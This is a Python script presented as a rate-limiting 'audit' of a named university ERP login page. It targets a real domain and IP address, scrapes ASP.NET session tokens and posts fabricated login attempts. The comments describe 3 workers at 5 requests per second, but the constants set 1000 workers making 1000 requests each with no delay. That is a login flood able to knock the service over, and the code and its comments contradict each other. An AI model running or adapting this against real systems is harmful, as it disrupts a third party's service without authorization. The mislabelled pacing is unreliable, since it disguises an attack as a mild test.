"""
Invertis University ERP - Multi-Target Rate-Limiting & Concurrency Audit
Supports both Domain Name and Direct IP targets.
Features:
  - 3 Concurrent Workers
  - Paced at 5 requests/sec per worker (15 req/sec max total)
  - Beautiful Terminal Table display
  - Auto-generated HTML Report (audit_report.html) for easy viewing in browser
"""

import time
import re
import os
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

TARGETS = [
    {"name": "Domain Endpoint", "url": "http://erp.invertisuniversity.ac.in:81/"},
    {"name": "Direct IP Endpoint", "url": "http://137.97.136.29:81/"}
]

# Configurable concurrency parameters
NUM_WORKERS = 1000
RATE_LIMIT_PER_WORKER = 100000  # requests per second per worker (0.2s pacing)
REQUESTS_PER_WORKER = 1000   # 5 requests per worker = 15 total requests per target
PACING_DELAY = 0  # 200 ms interval

def fetch_session_tokens(target_url):
    """Retrieves session cookie and ASP.NET WebForms tokens from target."""
    session = requests.Session()
    resp = session.get(target_url, timeout=10)
    html = resp.text

    vs = re.search(r'id="__VIEWSTATE"\s+value="([^"]*)"', html)
    vsg = re.search(r'id="__VIEWSTATEGENERATOR"\s+value="([^"]*)"', html)
    ev = re.search(r'id="__EVENTVALIDATION"\s+value="([^"]*)"', html)

    return {
        "cookies": session.cookies.get_dict(),
        "__VIEWSTATE": vs.group(1) if vs else "",
        "__VIEWSTATEGENERATOR": vsg.group(1) if vsg else "",
        "__EVENTVALIDATION": ev.group(1) if ev else "",
    }

def worker_routine(worker_id, target_url, tokens):
    """Executes a paced series of login POST requests for a single worker."""
    results = []
    for seq in range(1, REQUESTS_PER_WORKER + 1):
        req_id = f"W{worker_id}-R{seq}"
        post_data = {
            "__EVENTTARGET": "btnLogin",
            "__EVENTARGUMENT": "",
            "__VIEWSTATE": tokens["__VIEWSTATE"],
            "__VIEWSTATEGENERATOR": tokens["__VIEWSTATEGENERATOR"],
            "__EVENTVALIDATION": tokens["__EVENTVALIDATION"],
            "txtUserid": f"probe_{worker_id}_{seq}",
            "txtpassword": f"SimulatedPass_{seq}!",
            "hdPass": "",
        }

        start_time = time.time()
        try:
            resp = requests.post(
                target_url,
                data=post_data,
                cookies=tokens["cookies"],
                timeout=15,
                allow_redirects=False,
            )
            latency = round((time.time() - start_time) * 1000, 2)
            results.append({
                "id": req_id,
                "worker": worker_id,
                "seq": seq,
                "status": resp.status_code,
                "latency_ms": latency,
                "error": None
            })
        except Exception as e:
            latency = round((time.time() - start_time) * 1000, 2)
            results.append({
                "id": req_id,
                "worker": worker_id,
                "seq": seq,
                "status": 0,
                "latency_ms": latency,
                "error": str(e)
            })

        # Pacing: maintain 5 requests per second per worker
        time.sleep(PACING_DELAY)

    return results

def audit_target(target_info):
    target_name = target_info["name"]
    target_url = target_info["url"]

    print("\n" + "=" * 80)
    print(f"  TARGET: {target_name} ({target_url})")
    print("=" * 80)
    print(f"  Workers: {NUM_WORKERS} | Pacing: {RATE_LIMIT_PER_WORKER} req/s/worker | Total: {NUM_WORKERS * REQUESTS_PER_WORKER} requests")
    print("  Fetching initial ASP.NET tokens...")

    try:
        tokens = fetch_session_tokens(target_url)
        print("  Tokens retrieved successfully. Starting execution...\n")
    except Exception as e:
        print(f"  [!] Failed to connect to {target_url}: {e}")
        return {"name": target_name, "url": target_url, "results": [], "error": str(e)}

    start_time = time.time()
    all_results = []

    with ThreadPoolExecutor(max_workers=NUM_WORKERS) as executor:
        futures = [
            executor.submit(worker_routine, w + 1, target_url, tokens)
            for w in range(NUM_WORKERS)
        ]
        for f in as_completed(futures):
            all_results.extend(f.result())

    total_time = round(time.time() - start_time, 2)
    all_results.sort(key=lambda x: (x["worker"], x["seq"]))

    # Print Table in Terminal
    print("  +" + "-" * 10 + "+" + "-" * 10 + "+" + "-" * 16 + "+" + "-" * 16 + "+" + "-" * 20 + "+")
    print("  | Worker   | Req #    | Status Code    | Latency (ms)   | Result / Security  |")
    print("  +" + "-" * 10 + "+" + "-" * 10 + "+" + "-" * 16 + "+" + "-" * 16 + "+" + "-" * 20 + "+")

    for r in all_results:
        w_str = f"Worker {r['worker']}".center(10)
        req_str = f"#{r['seq']}".center(10)
        status_str = f"HTTP {r['status']}".center(16)
        lat_str = f"{r['latency_ms']} ms".center(16)
        res_str = "RATE LIMITED" if r["status"] in (429, 403) else "Accepted (No Limit)"
        res_str = res_str.center(20)
        print(f"  |{w_str}|{req_str}|{status_str}|{lat_str}|{res_str}|")

    print("  +" + "-" * 10 + "+" + "-" * 10 + "+" + "-" * 16 + "+" + "-" * 16 + "+" + "-" * 20 + "+")

    latencies = [r["latency_ms"] for r in all_results if r["status"] > 0]
    min_lat = min(latencies) if latencies else 0
    max_lat = max(latencies) if latencies else 0
    avg_lat = round(sum(latencies) / len(latencies), 2) if latencies else 0

    print(f"\n  [Summary] Completed {len(all_results)} requests in {total_time}s | Min: {min_lat}ms | Avg: {avg_lat}ms | Max: {max_lat}ms")
    return {
        "name": target_name,
        "url": target_url,
        "results": all_results,
        "total_time": total_time,
        "min_lat": min_lat,
        "avg_lat": avg_lat,
        "max_lat": max_lat,
    }

def generate_html_report(report_data):
    """Saves a standalone visual HTML report that can be opened in any browser."""
    html = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Invertis ERP Concurrency & Rate-Limit Audit</title>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0f172a; color: #f8fafc; padding: 30px; margin: 0; }
    .container { max-width: 1000px; margin: 0 auto; }
    h1 { color: #38bdf8; margin-bottom: 5px; font-size: 26px; }
    p.sub { color: #94a3b8; margin-top: 0; margin-bottom: 25px; }
    .card { background: #1e293b; border-radius: 12px; padding: 20px; margin-bottom: 30px; border: 1px solid #334155; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.3); }
    h2 { color: #f1f5f9; font-size: 20px; margin-top: 0; display: flex; justify-content: space-between; align-items: center; }
    .badge { padding: 4px 10px; border-radius: 6px; font-size: 13px; font-weight: 600; background: #ef4444; color: white; }
    .metrics { display: flex; gap: 15px; margin: 15px 0; }
    .metric-box { background: #0f172a; padding: 12px 16px; border-radius: 8px; flex: 1; border: 1px solid #334155; }
    .metric-val { font-size: 22px; font-weight: bold; color: #38bdf8; }
    .metric-label { font-size: 12px; color: #94a3b8; text-transform: uppercase; margin-top: 4px; }
    table { width: 100%; border-collapse: collapse; margin-top: 15px; }
    th { background: #334155; color: #f8fafc; text-align: left; padding: 10px; font-size: 14px; }
    td { padding: 9px 10px; border-bottom: 1px solid #334155; font-size: 14px; }
    tr:hover { background: rgba(56, 189, 248, 0.05); }
    .status-200 { color: #4ade80; font-weight: 600; }
    .status-warn { color: #f87171; font-weight: 600; }
  </style>
</head>
<body>
  <div class="container">
    <h1>Invertis ERP Concurrency & Rate-Limit Audit Report</h1>
    <p class="sub">Generated live via 3 concurrent workers | Paced rate: 5 req/s per worker (max 15 req/s total)</p>
"""
    for data in report_data:
        all_200 = all(r["status"] == 200 for r in data["results"])
        badge_text = "VULNERABLE (No Rate-Limiting)" if all_200 else "DEFENSE ACTIVE"
        badge_color = "#ef4444" if all_200 else "#22c55e"

        html += f"""
    <div class="card">
      <h2>
        <span>{data['name']} &mdash; <code style="color: #38bdf8; font-size: 16px;">{data['url']}</code></span>
        <span class="badge" style="background: {badge_color};">{badge_text}</span>
      </h2>
      <div class="metrics">
        <div class="metric-box"><div class="metric-val">{len(data['results'])}</div><div class="metric-label">Total Requests</div></div>
        <div class="metric-box"><div class="metric-val">{data['total_time']}s</div><div class="metric-label">Total Duration</div></div>
        <div class="metric-box"><div class="metric-val">{data['avg_lat']} ms</div><div class="metric-label">Avg Latency</div></div>
        <div class="metric-box"><div class="metric-val">{data['max_lat']} ms</div><div class="metric-label">Peak Latency</div></div>
      </div>
      <table>
        <thead>
          <tr>
            <th>Worker ID</th>
            <th>Request Sequence</th>
            <th>Status Code</th>
            <th>Latency (ms)</th>
            <th>Defense State</th>
          </tr>
        </thead>
        <tbody>
"""
        for r in data["results"]:
            st_class = "status-200" if r["status"] == 200 else "status-warn"
            st_text = f"HTTP {r['status']}"
            def_text = "VULNERABLE (Accepted)" if r["status"] == 200 else "THROTTLED"
            html += f"""
          <tr>
            <td>Worker {r['worker']}</td>
            <td>Request #{r['seq']}</td>
            <td class="{st_class}">{st_text}</td>
            <td>{r['latency_ms']} ms</td>
            <td class="{st_class}">{def_text}</td>
          </tr>
"""
        html += """
        </tbody>
      </table>
    </div>
"""
    html += """
  </div>
</body>
</html>
"""
    with open("audit_report.html", "w", encoding="utf-8") as f:
        f.write(html)
    print("  [+] Visual HTML Report generated: file://" + os.path.abspath("audit_report.html"))

def main():
    print("Starting Multi-Target Audit...")
    report_data = []
    for target in TARGETS:
        data = audit_target(target)
        if data:
            report_data.append(data)

    generate_html_report(report_data)
    print("\nAudit Complete. You can open 'audit_report.html' in your browser to view the visual report.\n")

if __name__ == "__main__":
    main()
